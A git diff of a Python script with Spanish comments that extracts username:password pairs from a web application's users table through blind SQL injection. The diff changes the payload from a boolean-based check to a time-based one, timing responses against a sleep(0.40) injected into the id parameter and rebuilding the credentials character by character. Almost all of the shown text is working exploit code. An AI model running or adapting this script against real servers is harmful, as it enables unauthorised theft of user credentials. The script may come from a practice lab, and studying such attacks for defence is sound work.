@@ -1,6 +1,3 @@
-# script de fuerza bruta para la enumeracion de usuarios:contraseña por boolean based blind sql injection
-# para querys sanitizadas sobre un servidor apache2
-
 import requests
 from pwn import *
 import string
@@ -30,19 +27,19 @@ def main():
         for j in range(33,126): 
            
             # bd enum
-            # sqli_url = url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id=1))=%d" % (i,j)
+            # sqli_url= url + "?id=1 and if(ascii(substr(database(),%d,1))=%d, sleep(0.40),1)" % (i,j)
 
-            # user:password enum
-            sqli_url = url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id=1))=%d" % (i,j)
-
+            sqli_url= url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d, sleep(0.40),1)" % (i,j)
             # print(f'\nprobando con {sqli_url}')
             p1.status(f'Probando en la posicion {i} con el caracter ascii {j}')
 
+            tiempo_inicial= time.time()
+
             r=requests.get(sqli_url)
 
-            if r.status_code==200:
-                # caracter=chr(j)
-                # print(f'Caracter encontrado: {caracter}')
+            tiempo_final= time.time()
+            
+            if (tiempo_final-tiempo_inicial) > 0.40:
                 datos += chr(j)
                 p2.status(datos)
                 break
